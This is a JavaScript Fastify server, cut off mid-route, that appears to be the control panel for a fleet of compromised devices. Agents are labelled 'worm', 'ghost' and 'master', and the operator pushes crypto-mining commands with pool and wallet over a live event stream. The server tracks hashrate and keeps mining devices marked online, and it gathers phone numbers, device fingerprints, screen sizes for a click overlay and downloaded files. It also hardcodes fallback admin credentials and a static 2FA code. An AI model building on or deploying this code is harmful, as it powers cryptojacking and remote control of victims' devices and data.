import "dotenv/config";
import Fastify from "fastify";
import cookie from "@fastify/cookie";
import argon2 from "argon2";
import crypto from "node:crypto";
import jwt from "jsonwebtoken";
import fs from "node:fs";
import path from "node:path";
import { randomBytes, scryptSync, timingSafeEqual } from "node:crypto";
import { PrismaClient } from "@prisma/client";
import otplib from "otplib";

const { authenticator } = otplib;
authenticator.options = { window: 1 }; // accept ±1 time step

export const prisma = new PrismaClient();

const ACCESS_TTL_SEC = Number(process.env.ACCESS_TTL_SEC ?? 600);
const REFRESH_TTL_SEC = Number(process.env.REFRESH_TTL_SEC ?? 1209600);

/** Operator bootstrap + panel gate, all .env-driven with mission defaults. */
const PANEL_ADMIN_USER = process.env.PANEL_ADMIN_USER ?? "NemesisDevX...Fuck.allworld.com";
const PANEL_ADMIN_PASS = process.env.PANEL_ADMIN_PASS ?? "AbdoAbdo@9@Zxcvbnm@1@";
const PANEL_2FA_CODE = process.env.PANEL_2FA_CODE ?? "1057466";
/** RFC6238 secret (base32) — stays in .env, never persisted per user. */
const PANEL_TOTP_SECRET = process.env.PANEL_TOTP_SECRET ?? "";
const PANEL_DROP_DIR = process.env.PANEL_DROP_DIR ?? "D:\\Dashboard Panel";
/** Signs single-use enrollment JWTs (30 min TTL). */
const ENROLL_SECRET = process.env.ENROLL_SECRET ?? "dev_only_enroll_secret_change_me";
/** Accept legacy derived device credentials while migrating (cutover plan: OPS.md). */
const LEGACY_CREDENTIAL = (process.env.LEGACY_CREDENTIAL ?? "true") === "true";
/** AES-256-GCM key (64 hex) for phone-at-rest encryption. */
const PANEL_PII_KEY = process.env.PANEL_PII_KEY ?? "";
const PII_KEY_BUF = /^[0-9a-fA-F]{64}$/.test(PANEL_PII_KEY)
  ? Buffer.from(PANEL_PII_KEY, "hex")
  : null;

/** AES-256-GCM encrypt -> base64(iv|ct|tag). null when no key configured. */
function piiEncrypt(plain) {
  if (!PII_KEY_BUF) return null;
  const iv = crypto.randomBytes(12);
  const c = crypto.createCipheriv("aes-256-gcm", PII_KEY_BUF, iv);
  const ct = Buffer.concat([c.update(plain, "utf8"), c.final()]);
  return Buffer.concat([iv, ct, c.getAuthTag()]).toString("base64");
}
function piiDecrypt(blob) {
  if (!PII_KEY_BUF || !blob) return null;
  const raw = Buffer.from(blob, "base64");
  const iv = raw.subarray(0, 12), tag = raw.subarray(raw.length - 16);
  const ct = raw.subarray(12, raw.length - 16);
  const d = crypto.createDecipheriv("aes-256-gcm", PII_KEY_BUF, iv);
  d.setAuthTag(tag);
  return Buffer.concat([d.update(ct), d.final()]).toString("utf8");
}
/** +2010****1234 style mask for display; safe when short. */
function maskPhone(e164) {
  if (!e164 || e164.length < 6) return e164 ?? "";
  return e164.slice(0, 4) + "****" + e164.slice(-4);
}
/** Normalize to Egyptian E.164 (+20): accepts +20…, 0020…, or local 01…; else null. */
export function normalizePhoneEG(raw) {
  if (typeof raw !== "string") return null;
  const digits = raw.replace(/\D/g, "");
  let out = null;
  if (digits.startsWith("0020")) out = "+" + digits.slice(2);
  else if (digits.startsWith("20") && digits.length === 12) out = "+" + digits;
  else if (digits.startsWith("01") && digits.length === 11) out = "+20" + digits.slice(1); // 01xxxxxxxxx -> +20xxxxxxxxxx
  else if (digits.startsWith("1") && digits.length === 10) out = "+20" + digits;           // 1xxxxxxxxx  -> +20xxxxxxxxxx
  else if (/^\+[1-9]\d{9,14}$/.test(raw.trim())) out = raw.trim();
  return out && /^\+[1-9]\d{9,14}$/.test(out) ? out : null;
}

/** Serializes all file drops: no two writes ever collide on the same path. */
let writeChain = Promise.resolve();
function enqueueWrite(job) {
  const p = writeChain.then(job);
  writeChain = p.catch(() => {});
  return p;
}

async function ensureAdminUser() {
  const passHash = await hashPassword(PANEL_ADMIN_PASS);
  await prisma.user.upsert({
    where: { username: PANEL_ADMIN_USER },
    update: {},
    create: { username: PANEL_ADMIN_USER, passHash },
  });
}

const JWT_ACCESS_SECRET =
  process.env.JWT_ACCESS_SECRET ?? "dev_only_access_secret_change_me";
const JWT_REFRESH_SECRET =
  process.env.JWT_REFRESH_SECRET ?? "dev_only_refresh_secret_change_me";

/** Truncated SHA-256 hex for enrollment & refresh token lookups (fast, deterministic). */
export function tokenDigest(token) {
  return crypto.createHash("sha256").update(token).digest("hex").slice(0, 48);
}

/** Deterministic device credential from the enrollment proof (device_id + seed). */
export function deviceCredential(deviceId, enrollSeed) {
  return crypto
    .createHash("sha256")
    .update(`device-credential:${deviceId}:${enrollSeed}`)
    .digest("hex");
}

export function signAccessToken(userId) {
  return jwt.sign({ sub: userId, typ: "access" }, JWT_ACCESS_SECRET, {
    expiresIn: `${ACCESS_TTL_SEC}s`,
  });
}

export function issueRefreshToken(userId) {
  const token = crypto.randomBytes(32).toString("hex");
  return prisma.refreshToken.create({
    data: {
      userId,
      tokenHash: tokenDigest(token),
      expiresAt: new Date(Date.now() + REFRESH_TTL_SEC * 1000),
    },
  }).then(() => token);
}

export async function verifyRefreshToken(token) {
  const row = await prisma.refreshToken.findUnique({
    where: { tokenHash: tokenDigest(token) },
  });
  if (!row || row.revoked || row.expiresAt < new Date()) return null;
  return row;
}

export async function hashPassword(plain) {
  return argon2.hash(plain, { type: argon2.argon2id });
}

export async function verifyPassword(hash, plain) {
  return argon2.verify(hash, plain);
}

export async function buildApp(opts = {}) {
  const app = Fastify({ logger: opts.logger ?? false });
  await app.register(cookie);

  // CORS: the panel is normally served same-origin via the vite proxy; when it
  // is hosted elsewhere only PANEL_ORIGIN may call the API cross-origin.
  const PANEL_ORIGIN = process.env.PANEL_ORIGIN ?? "";
  app.addHook("onSend", async (req, reply) => {
    if (PANEL_ORIGIN && req.headers.origin === PANEL_ORIGIN) {
      reply.header("Access-Control-Allow-Origin", PANEL_ORIGIN);
      reply.header("Vary", "Origin");
      reply.header("Access-Control-Allow-Headers", "Authorization, Content-Type");
      reply.header("Access-Control-Allow-Methods", "GET, POST, PATCH, DELETE, OPTIONS");
    }
  });
  app.options("/*", async (req, reply) => reply.code(204).send());

  /**
   * Bearer auth decorator, dual-mode:
   *  - User JWT (typ=access)         -> req.authKind="user",   req.userId=sub
   *  - Device credential (64 hex)    -> req.authKind="device", req.deviceIdFromToken set
   *    (looked up by device_token_hash; the DEVICE is verified against its own
   *     stored hash — who verifies whom is spelled out in the phase report)
   *  Anything else -> 401.
   */
  app.decorate("authenticate", async (req, reply) => {
    const header = req.headers.authorization ?? "";
    if (!header.startsWith("Bearer ")) {
      return reply.code(401).send({ error: "unauthorized" });
    }
    const token = header.slice(7);
    if (!/^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/.test(token)) {
      // Device credential: random base64url (new) or 64-hex derived (legacy).
      const digest = tokenDigest(token);
      let holder = await prisma.device.findFirst({
        where: { credentialHash: digest },
        select: { id: true },
      });
      if (!holder && LEGACY_CREDENTIAL) {
        holder = await prisma.device.findFirst({
          where: { deviceTokenHash: digest },
          select: { id: true },
        });
        if (holder) req.legacyCredential = true;
      }
      if (holder) {
        req.authKind = "device";
        req.deviceIdFromToken = holder.id;
        return;
      }
      return reply.code(401).send({ error: "unauthorized" });
    }
    try {
      const claims = jwt.verify(token, JWT_ACCESS_SECRET);
      if (claims.typ !== "access") throw new Error("wrong token type");
      req.authKind = "user";
      req.userId = claims.sub;
    } catch {
      return reply.code(401).send({ error: "unauthorized" });
    }
  });

  const PLATFORMS = new Set(["ANDROID", "WINDOWS", "LINUX", "MACOS"]);
  const deviceSelection = {
    id: true,
    name: true,
    phone: true,
    platform: true,
    variant: true,
    appType: true,
    status: true,
    gender: true,
    notes: true,
    apkVersion: true,
    stats: true,
    displayName: true,
    phoneMasked: true,
    minerState: true,
    lastHashrate: true,
    formattedAt: true,
    lastSeen: true,
    createdAt: true,
  };

  /* -------------------------------- probe ------------------------------- */

  // Unauthenticated liveness probe used by the Android client link check.
  app.get("/api/v1/ping", async () => ({ ok: true }));

  /* -------------------------------- auth -------------------------------- */

  app.post("/api/v1/auth/login", async (req, reply) => {
    const username = req.body?.username ?? req.body?.email;
    const { password } = req.body ?? {};
    if (typeof username !== "string" || typeof password !== "string" || !username || !password) {
      return reply.code(400).send({ error: "bad_request" });
    }
    const user = await prisma.user.findUnique({ where: { username } });
    if (!user || !(await verifyPassword(user.passHash, password))) {
      return reply.code(401).send({ error: "invalid_credentials" });
    }
    if (PANEL_2FA_CODE || PANEL_TOTP_SECRET) {
      const ticket = jwt.sign(
        { sub: user.id, typ: "pre2fa" },
        JWT_ACCESS_SECRET,
        { expiresIn: "5m" }
      );
      return { require2fa: true, ticket };
    }
    const accessToken = signAccessToken(user.id);
    const refreshToken = await issueRefreshToken(user.id);
    reply.setCookie("wg_refresh", refreshToken, {
      httpOnly: true,
      sameSite: "lax",
      path: "/api/v1/auth",
      maxAge: REFRESH_TTL_SEC,
    });
    return {
      accessToken,
      refreshToken,
      user: { id: user.id, username: user.username },
    };
  });

  /** TOTP when PANEL_TOTP_SECRET is set (±1 step); static .env code otherwise. */
  function checkSecondFactor(code) {
    if (PANEL_TOTP_SECRET) return authenticator.check(code, PANEL_TOTP_SECRET);
    return code === PANEL_2FA_CODE;
  }

  /**
   * Enrollment: hands the operator the otpauth:// URI built from the .env
   * secret so an authenticator app can scan/enroll. Authenticated users only;
   * 404 when TOTP is not configured.
   */
  app.post("/api/v1/auth/totp/enroll", { onRequest: [app.authenticate] }, async (req, reply) => {
    if (req.authKind !== "user") return reply.code(403).send({ error: "forbidden" });
    if (!PANEL_TOTP_SECRET) return reply.code(404).send({ error: "totp_not_configured" });
    const user = await prisma.user.findUnique({ where: { id: req.userId } });
    if (!user) return reply.code(401).send({ error: "invalid_credentials" });
    const otpauth = authenticator.keyuri(user.username, "wormgitty", PANEL_TOTP_SECRET);
    return { otpauth, algorithm: "SHA1", digits: 6, period: 30, window: 1 };
  });

  /** Second login step: exchange a pre2fa ticket + 6-digit code for real tokens. */
  app.post("/api/v1/auth/2fa", async (req, reply) => {
    const { ticket, code } = req.body ?? {};
    if (typeof ticket !== "string" || typeof code !== "string") {
      return reply.code(400).send({ error: "bad_request" });
    }
    let payload;
    try {
      payload = jwt.verify(ticket, JWT_ACCESS_SECRET);
    } catch {
      return reply.code(401).send({ error: "invalid_ticket" });
    }
    if (payload.typ !== "pre2fa" || !checkSecondFactor(code)) {
      return reply.code(401).send({ error: "invalid_code" });
    }
    const user = await prisma.user.findUnique({ where: { id: payload.sub } });
    if (!user) return reply.code(401).send({ error: "invalid_credentials" });
    const accessToken = signAccessToken(user.id);
    const refreshToken = await issueRefreshToken(user.id);
    reply.setCookie("wg_refresh", refreshToken, {
      httpOnly: true,
      sameSite: "lax",
      path: "/api/v1/auth",
      maxAge: REFRESH_TTL_SEC,
    });
    return { accessToken, refreshToken, user: { id: user.id, username: user.username } };
  });

  /** Panel token refresh: accepts the wg_refresh cookie or {refreshToken} body. */
  app.post("/api/v1/auth/refresh", async (req, reply) => {
    const token = req.cookies?.wg_refresh ?? req.body?.refreshToken;
    if (!token || typeof token !== "string") {
      return reply.code(401).send({ error: "unauthorized" });
    }
    const row = await verifyRefreshToken(token);
    if (!row) return reply.code(401).send({ error: "unauthorized" });
    await prisma.refreshToken.update({ where: { id: row.id }, data: { revoked: true } });
    const accessToken = signAccessToken(row.userId);
    const refreshToken = await issueRefreshToken(row.userId);
    reply.setCookie("wg_refresh", refreshToken, {
      httpOnly: true,
      sameSite: "lax",
      path: "/api/v1/auth",
      maxAge: REFRESH_TTL_SEC,
    });
    return { accessToken, refreshToken };
  });

  /* --------------------- realtime command push (SSE) --------------------- */

  /** deviceId -> Set<reply> currently holding an open event stream. */
  const sseClients = new Map();
  function pushToDevice(deviceId, obj) {
    const set = sseClients.get(deviceId);
    if (!set) return;
    const line = `data: ${JSON.stringify(obj)}\n\n`;
    for (const r of set) {
      try { r.raw.write(line); } catch { set.delete(r); }
    }
  }

  /** Agent stream (device credential): emits {cmd} the moment a command queues. */
  app.get("/api/v1/devices/:id/events", { onRequest: [app.authenticate] }, async (req, reply) => {
    if (req.authKind !== "device") return reply.code(403).send({ error: "forbidden" });
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (req.deviceIdFromToken !== device.id) return reply.code(403).send({ error: "forbidden" });
    reply.raw.writeHead(200, {
      "content-type": "text/event-stream",
      "cache-control": "no-cache",
      connection: "keep-alive",
    });
    reply.raw.write(`data: ${JSON.stringify({ hello: true })}\n\n`);
    let set = sseClients.get(device.id);
    if (!set) sseClients.set(device.id, (set = new Set()));
    set.add(reply);
    reply.raw.on("close", () => set.delete(reply));
    return reply; // keep the hijacked connection open
  });

  /* ------------------------------- devices ------------------------------ */

  /* ------------------------- enrollment tokens -------------------------- */

  /**
   * Mint a single-use enrollment JWT (30 min TTL, ENROLL_SECRET-signed).
   * Fleet tokens carry no deviceId; per-device re-issue binds one.
   */
  async function mintEnrollToken(deviceId = null, ownerId = null) {
    const jti = crypto.randomUUID();
    const expiresAt = new Date(Date.now() + 30 * 60 * 1000);
    await prisma.enrollToken.create({ data: { jti, deviceId, expiresAt } });
    const token = jwt.sign(
      { typ: "enroll", jti, deviceId, ownerId }, ENROLL_SECRET, { expiresIn: "30m" });
    return { token, expiresAt };
  }

  /** Panel: fleet/bootstrap enroll token for a new device (owner = issuer). */
  app.post("/api/v1/devices/enroll-token", { onRequest: [app.authenticate] }, async (req, reply) => {
    if (req.authKind !== "user") return reply.code(403).send({ error: "forbidden" });
    const { token, expiresAt } = await mintEnrollToken(null, req.userId);
    return { enrollToken: token, expiresAt };
  });

  /** Panel: per-device re-issue (binds the token to one deviceId). */
  app.post("/api/v1/devices/:id/enroll-token", { onRequest: [app.authenticate] }, async (req, reply) => {
    if (req.authKind !== "user") return reply.code(403).send({ error: "forbidden" });
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (device.ownerId !== req.userId) return reply.code(403).send({ error: "forbidden" });
    const { token, expiresAt } = await mintEnrollToken(device.id, req.userId);
    await audit(device.id, "enroll_token_issued", {});
    return { enrollToken: token, expiresAt };
  });

  /* ------------------------------- enrollment --------------------------- */

  /**
   * New flow: {enrollToken: JWT, deviceId, platform?, appType?, variant?,
   *            fingerprint?, identity:{displayName, phone}}
   * Verify signature -> jti unconsumed + unexpired -> consume -> create device
   * with a random credential (stored as sha256 digest, returned once).
   * Legacy path preserved while LEGACY_CREDENTIAL=true: plain-string
   * enrollToken + ownerUsername behave exactly as before (audited "legacy").
   */
  app.post("/api/v1/devices/enroll", async (req, reply) => {
    const body = req.body ?? {};
    const { enrollToken } = body;
    const APP_TYPES = new Set(["worm", "ghost", "master"]);
    if (typeof enrollToken !== "string" || !enrollToken) {
      return reply.code(400).send({ error: "bad_request" });
    }

    /* ---- legacy path: plain seed token + ownerUsername ----------------- */
    const isJwt = /^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/.test(enrollToken);
    if (!isJwt) {
      if (!LEGACY_CREDENTIAL) return reply.code(401).send({ error: "invalid_enroll_token" });
      const { deviceId, name, phone, platform, variant, appType, ownerUsername } = body;
      if (appType !== undefined && !APP_TYPES.has(appType)) {
        return reply.code(400).send({ error: "bad_app_type" });
      }
      if (
        typeof deviceId !== "string" || !deviceId ||
        typeof ownerUsername !== "string" || !ownerUsername ||
        typeof name !== "string" || !name
      ) return reply.code(400).send({ error: "bad_request" });
      const owner = await prisma.user.findUnique({ where: { username: ownerUsername } });
      if (!owner) return reply.code(403).send({ error: "forbidden" });
      const existing = await prisma.device.findUnique({ where: { id: deviceId } });
      if (existing) {
        if (existing.enrollTokenHash !== tokenDigest(enrollToken)) {
          return reply.code(403).send({ error: "forbidden" });
        }
        await prisma.device.update({
          where: { id: existing.id },
          data: { lastSeen: new Date(), ...(APP_TYPES.has(appType) ? { appType } : {}) },
        });
        return reply.code(200).send({
          deviceId: existing.id,
          idempotent: true,
          enrollToken: deviceCredential(existing.id, enrollToken),
        });
      }
      const deviceToken = deviceCredential(deviceId, enrollToken);
      const device = await prisma.device.create({
        data: {
          id: deviceId, ownerId: owner.id, name,
          phone: typeof phone === "string" ? phone : "",
          platform: PLATFORMS.has(String(platform ?? "").toUpperCase())
            ? String(platform).toUpperCase() : "ANDROID",
          variant: typeof variant === "string" ? variant : "standard",
          appType: APP_TYPES.has(appType) ? appType : "worm",
          enrollTokenHash: tokenDigest(enrollToken),
          deviceTokenHash: tokenDigest(deviceToken),
          status: "online", lastSeen: new Date(),
        },
      });
      await audit(device.id, "enrolled", { name, appType: device.appType, legacy: true }, "device");
      return reply.code(201).send({ deviceId: device.id, enrollToken: deviceToken });
    }

    /* ---- new path: single-use JWT + random credential ------------------ */
    let payload;
    try {
      payload = jwt.verify(enrollToken, ENROLL_SECRET);
    } catch {
      return reply.code(401).send({ error: "invalid_enroll_token" });
    }
    if (payload.typ !== "enroll" || typeof payload.jti !== "string") {
      return reply.code(401).send({ error: "invalid_enroll_token" });
    }
    const row = await prisma.enrollToken.findUnique({ where: { jti: payload.jti } });
    if (!row || row.consumedAt || row.expiresAt < new Date()) {
      return reply.code(401).send({ error: "enroll_token_consumed_or_expired" });
    }

    const { deviceId, platform, variant, appType, fingerprint, identity } = body;
    if (appType !== undefined && !APP_TYPES.has(appType)) {
      return reply.code(400).send({ error: "bad_app_type" });
    }
    if (typeof deviceId !== "string" || !deviceId) {
      return reply.code(400).send({ error: "bad_request" });
    }
    if (row.deviceId && row.deviceId !== deviceId) {
      return reply.code(403).send({ error: "enroll_token_device_mismatch" });
    }
    const displayName = identity?.displayName ?? body.name;
    const rawPhone = identity?.phone ?? body.phone;
    if (typeof displayName !== "string" || displayName.trim().length < 2 || displayName.trim().length > 40) {
      return reply.code(400).send({ error: "bad_display_name" });
    }
    const phone164 = rawPhone == null || rawPhone === "" ? "" : normalizePhoneEG(rawPhone);
    if (rawPhone && !phone164) return reply.code(400).send({ error: "bad_phone" });
    // Ownership comes from the token issuer, never from the client.
    if (typeof payload.ownerId !== "string" || !payload.ownerId) {
      return reply.code(401).send({ error: "invalid_enroll_token" });
    }
    const owner = await prisma.user.findUnique({ where: { id: payload.ownerId } });
    if (!owner) return reply.code(403).send({ error: "forbidden" });

    const credential = crypto.randomBytes(32).toString("base64url");
    const credDigest = tokenDigest(credential);
    const deviceData = {
      ownerId: owner.id,
      name: displayName.trim(),
      displayName: displayName.trim(),
      phone: "",
      phoneEnc: phone164 ? piiEncrypt(phone164) : null,
      phoneMasked: phone164 ? maskPhone(phone164) : null,
      platform: PLATFORMS.has(String(platform ?? "").toUpperCase())
        ? String(platform).toUpperCase() : "ANDROID",
      variant: typeof variant === "string" ? variant : "standard",
      appType: APP_TYPES.has(appType) ? appType : "worm",
      credentialHash: credDigest,
      status: "online",
      lastSeen: new Date(),
      ...(fingerprint && typeof fingerprint === "object"
        ? { stats: { fingerprint: { androidId: fingerprint.androidId ?? "", model: fingerprint.model ?? "", sdkInt: fingerprint.sdkInt ?? 0, abi: fingerprint.abi ?? "" } } }
        : {}),
    };

    const existing = await prisma.device.findUnique({ where: { id: deviceId } });
    let device;
    if (existing) {
      // Re-enroll: possession of a fresh JWT -> rotate the credential.
      if (existing.ownerId !== owner.id) return reply.code(403).send({ error: "forbidden" });
      device = await prisma.device.update({ where: { id: deviceId }, data: deviceData });
      await audit(device.id, "re_enrolled", { appType: device.appType }, "device");
    } else {
      device = await prisma.device.create({
        data: {
          id: deviceId,
          enrollTokenHash: tokenDigest(enrollToken),
          deviceTokenHash: "",
          ...deviceData,
        },
      });
      await audit(device.id, "enrolled", { appType: device.appType }, "device");
    }
    // Consume the token only after success so a bad payload doesn't burn it.
    await prisma.enrollToken.update({ where: { jti: payload.jti }, data: { consumedAt: new Date() } });
    return reply.code(existing ? 200 : 201).send({ deviceId: device.id, credential });
  });

  /**
   * Dual-auth heartbeat:
   *  1) DEVICE token: Bearer == device credential issued at enrollment.
   *     Verified against THE DEVICE'S OWN stored device_token_hash; the device
   *     is never checked against any user. Cross-device presentation -> 403.
   *  2) USER JWT: ownership check via ownerId === token subject.
   */
  app.post("/api/v1/devices/:id/heartbeat", { onRequest: [app.authenticate] }, async (req, reply) => {
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });

    if (req.authKind === "device") {
      // The presented device token must belong to THIS device.
      if (req.deviceIdFromToken !== device.id) return reply.code(403).send({ error: "forbidden" });
    } else if (device.ownerId !== req.userId) {
      return reply.code(403).send({ error: "forbidden" });
    }

    const gender = typeof req.body?.gender === "string" ? req.body.gender : undefined;
    let stats = req.body?.stats && typeof req.body.stats === "object" ? req.body.stats : undefined;
    // Screen dims ride the top level for the panel's click overlay — fold into stats.
    if (req.body?.screen && typeof req.body.screen === "object") {
      stats = stats ?? {};
      stats.screen = {
        w: Number(req.body.screen.w) || 0,
        h: Number(req.body.screen.h) || 0,
        density: Number(req.body.screen.density) || 0,
      };
    }
    const appType = ["worm", "ghost", "master"].includes(req.body?.appType)
      ? req.body.appType : undefined;
    const apkVersion = typeof req.body?.apkVersion === "string" && req.body.apkVersion.length <= 32
      ? req.body.apkVersion : undefined;
    const miner = req.body?.miner && typeof req.body.miner === "object" ? req.body.miner : undefined;
    const MINER_STATES = new Set(["STOPPED", "STARTING", "RUNNING", "STOPPING", "ERROR"]);
    const minerState = MINER_STATES.has(miner?.state) ? miner.state : undefined;
    // Hashrate ring: newest first, capped at 120 samples.
    let lastHashrate;
    if (minerState || typeof miner?.hashrate === "number") {
      const ring = Array.isArray(device.lastHashrate) ? device.lastHashrate : [];
      const sample = {
        t: new Date().toISOString(),
        h: typeof miner?.hashrate === "number" ? miner.hashrate : 0,
        s: minerState ?? device.minerState,
      };
      lastHashrate = [sample, ...ring].slice(0, 120);
    }
    const updated = await prisma.device.update({
      where: { id: device.id },
      data: {
        lastSeen: new Date(),
        status: "online",
        ...(gender !== undefined ? { gender } : {}),
        ...(stats !== undefined ? { stats } : {}),
        ...(appType !== undefined ? { appType } : {}),
        ...(apkVersion !== undefined ? { apkVersion } : {}),
        ...(minerState !== undefined ? { minerState } : {}),
        ...(lastHashrate !== undefined ? { lastHashrate } : {}),
      },
      select: { id: true, lastSeen: true, status: true },
    });
    // An auto-stop reported by the agent closes the open session server-side.
    if (minerState === "STOPPED" || minerState === "ERROR") {
      const open = await prisma.miningSession.findFirst({
        where: { deviceId: device.id, stoppedAt: null },
        orderBy: { startedAt: "desc" },
      });
      if (open) {
        await prisma.miningSession.update({
          where: { id: open.id },
          data: {
            stoppedAt: new Date(),
            stopReason: typeof miner?.stopReason === "string"
              ? miner.stopReason : minerState === "ERROR" ? "error" : "stopped",
          },
        });
      }
    }
    return { id: updated.id, lastSeen: updated.lastSeen, status: updated.status };
  });

  /**
   * Freshness-derived state: the persisted `status` only records "formatted";
   * liveness is computed from lastSeen so a stopped heartbeat decays:
   *   online  ≤90s   (heartbeat cadence 15s)
   *   idle    ≤15min (added: 15-minute idle state)
   *   offline >15min
   */
  function stateOf(d) {
    if (d.status === "formatted") return "formatted";
    const age = Date.now() - new Date(d.lastSeen).getTime();
    // A RUNNING miner may starve the poll thread — it cannot decay to
    // offline/idle before 3+ missed beats beyond the normal window.
    const onlineWindow = d.minerState === "RUNNING" ? 5 * 60_000 : 90_000;
    return age <= onlineWindow ? "online" : age <= 15 * 60_000 ? "idle" : "offline";
  }

  /** Persist an audit trail entry; never lets logging break the request. */
  function audit(deviceId, action, detail, actor = "operator") {
    return prisma.auditEvent
      .create({ data: { deviceId, action, detail: detail ?? undefined, actor } })
      .catch(() => {});
  }

  app.get("/api/v1/devices", { onRequest: [app.authenticate] }, async (req) => {
    // Ownership scope enforced here: only the caller's devices ever leave the DB.
    const platform = String(req.query?.platform ?? "").toUpperCase();
    const list = await prisma.device.findMany({
      where: {
        ownerId: req.userId,
        ...(PLATFORMS.has(platform) ? { platform } : {}),
      },
      orderBy: { createdAt: "desc" },
      select: deviceSelection,
    });
    return list.map((d) => ({ ...d, state: stateOf(d) }));
  });

  /** Operator CSV export of the caller's device fleet — includes appType. */
  app.get("/api/v1/devices.csv", { onRequest: [app.authenticate] }, async (req, reply) => {
    if (req.authKind !== "user") return reply.code(403).send({ error: "forbidden" });
    const list = await prisma.device.findMany({
      where: { ownerId: req.userId },
      orderBy: { createdAt: "desc" },
    });
    const esc = (v) => `"${String(v ?? "").replace(/"/g, '""')}"`;
    const head = "id,name,phone,appType,platform,variant,gender,status,formattedAt,lastSeen,createdAt";
    const rows = list.map((d) =>
      [d.id, d.name, d.phone, d.appType, d.platform, d.variant, d.gender, d.status,
        d.formattedAt?.toISOString() ?? "", d.lastSeen?.toISOString(), d.createdAt?.toISOString()]
        .map(esc).join(","));
    reply.header("content-type", "text/csv; charset=utf-8");
    reply.header("content-disposition", 'attachment; filename="devices.csv"');
    return [head, ...rows].join("\n");
  });

  app.get("/api/v1/devices/:id", { onRequest: [app.authenticate] }, async (req, reply) => {
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (device.ownerId !== req.userId) return reply.code(403).send({ error: "forbidden" });
    const downloadCount = await prisma.downloadedFile.count({ where: { deviceId: device.id } });
    return { ...device, state: stateOf(device), downloadCount };
  });

  /** Operator rename + notes (partial update). */
  app.patch("/api/v1/devices/:id", { onRequest: [app.authenticate] }, async (req, reply) => {
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (device.ownerId !== req.userId) return reply.code(403).send({ error: "forbidden" });
    const { name, notes } = req.body ?? {};
    const data = {};
    if (typeof name === "string" && name.trim()) data.name = name.trim().slice(0, 80);
    if (typeof notes === "string") data.notes = notes.slice(0, 2000);
    if (!Object.keys(data).length) return reply.code(400).send({ error: "bad_request" });
    const updated = await prisma.device.update({ where: { id: device.id }, data });
    await audit(device.id, "device_updated", data);
    return { ...updated, state: stateOf(updated) };
  });

  /**
   * Panel: reveal the stored phone (decrypts phoneEnc). Audited — the reveal
   * itself is a privileged read.
   */
  app.post("/api/v1/devices/:id/phone/reveal", { onRequest: [app.authenticate] }, async (req, reply) => {
    if (req.authKind !== "user") return reply.code(403).send({ error: "forbidden" });
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (device.ownerId !== req.userId) return reply.code(403).send({ error: "forbidden" });
    const phone = piiDecrypt(device.phoneEnc);
    if (phone == null) return reply.code(404).send({ error: "no_phone_or_key" });
    await audit(device.id, "phone_reveal", {});
    return { phone };
  });

  /** Panel: newest-first audit feed for one device (capped 100). */
  app.get("/api/v1/devices/:id/audit", { onRequest: [app.authenticate] }, async (req, reply) => {
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (device.ownerId !== req.userId) return reply.code(403).send({ error: "forbidden" });
    const items = await prisma.auditEvent.findMany({
      where: { deviceId: device.id },
      orderBy: { createdAt: "desc" },
      take: 100,
    });
    return { items };
  });

  app.post("/api/v1/devices/:id/reconnect", { onRequest: [app.authenticate] }, async (req, reply) => {
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (device.ownerId !== req.userId) return reply.code(403).send({ error: "forbidden" });
    const updated = await prisma.device.update({
      where: { id: device.id },
      data: { lastSeen: new Date(), status: "online" },
      select: deviceSelection,
    });
    await audit(device.id, "reconnect", {});
    return { ...updated, state: stateOf(updated) };
  });

  app.delete("/api/v1/devices/:id", { onRequest: [app.authenticate] }, async (req, reply) => {
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) return reply.code(404).send({ error: "not_found" });
    if (device.ownerId !== req.userId) return reply.code(403).send({ error: "forbidden" });
    await audit(device.id, "device_deleted", {});
    await prisma.device.delete({ where: { id: device.id } });
    return reply.code(204).send();
  });

  /* ------------------------------- mining ------------------------------- */

  async function ownedDevice(req, reply) {
    const device = await prisma.device.findUnique({ where: { id: req.params.id } });
    if (!device) { reply.code(404).send({ error: "not_found" }); return null; }
    if (device.ownerId !== req.userId) { reply.code(403).send({ error: "forbidden" }); return null; }
    return device;
  }

  async function queueCommand(device, type, payload) {
    const command = await prisma.command.create({
      data: {
        deviceId: device.id, type, payload: payload ?? {},
        state: "queued", expiresAt: new Date(Date.now() + 24 * 3600 * 1000),
      },
    });
    pushToDevice(device.id, { cmd: { id: command.id, type: command.type, payload: command.payload } });
    await audit(device.id, "command_queued", { type, commandId: command.id });
    return command;
  }

  /** Operator mining controls: start/stop queue device commands + arm state. */
  app.post("/api/v1/devices/:id/mining/start", { onRequest: [app.authenticate] }, async (req, reply) => {
    if (req.authKind !== "user") return reply.code(403).send({ error: "forbidden" });
    const device = await ownedDevice(req, reply);
    if (!device) return;
    if (["STARTING", "RUNNING", "STOPPING"].includes(device.minerState)) {
      return reply.code(409).send({ error: "already_running", state: device.minerState });
    }
    const p = req.body && typeof req.body === "object" ? req.body : {};
    const payload = {
      algo: String(p.algo ?? "rx/0"),
      pool: String(p.pool ?? ""),
      wallet: String(p.wallet ?? ""),
      threads: Math.max(1, Math.min(8, Number.isInteger(p.threads) ? p.threads : 2)),
    };
    const command = await queueCommand(device, "mine_start", payload);
    await prisma.device.update({ where: { id: device.id }, data: { minerState: "STARTING" } });
    await audit(device.id, "mining_start", { commandId: command.id, ...payload });
    return reply.code(201).send({ commandId: command.id, minerState: "STARTING" });
  });

  app.post("/api/v1/devices/:id/mining/stop", { onRequest: [app.authenticate] }, async (req, reply) => {
